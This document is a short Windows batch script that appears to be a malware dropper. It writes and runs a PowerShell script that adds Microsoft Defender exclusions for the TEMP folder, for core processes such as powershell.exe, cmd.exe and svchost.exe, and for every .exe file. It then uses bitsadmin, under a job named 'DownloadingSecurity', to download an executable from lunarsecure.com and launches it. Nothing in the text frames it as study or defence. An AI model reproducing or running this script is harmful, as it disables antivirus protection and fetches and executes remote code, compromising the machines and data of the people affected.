��&cls
@echo off
setlocal

REM Get the TEMP path
set tempPath=%TEMP%

REM Create PowerShell script to add Defender exclusions
set addExclusionScriptPath=%TEMP%\WinKrPs.ps1
(
    echo Add-MpPreference -ExclusionPath '%tempPath%'
    echo Add-MpPreference -ExclusionProcess 'powershell.exe'
    echo Add-MpPreference -ExclusionProcess 'cmd.exe'
    echo Add-MpPreference -ExclusionProcess 'svchost.exe'
    echo Add-MpPreference -ExclusionProcess 'services.exe'
    echo Add-MpPreference -ExclusionExtension '.exe'
) > "%addExclusionScriptPath%"

REM Run the PowerShell script
powershell.exe -ExecutionPolicy Bypass -File "%addExclusionScriptPath%"

REM Wait for 3 seconds using timeout
timeout /t 3 /nobreak > nul

REM Download WinKr01.exe
set exeFileName=WinKr01.exe
set downloadUrl=https://lunarsecure.com/kr.exe
bitsadmin.exe /transfer "DownloadingSecurity" %downloadUrl% "%tempPath%\%exeFileName%"

REM Start WinKr01.exe
start "" "%tempPath%\%exeFileName%"

endlocal

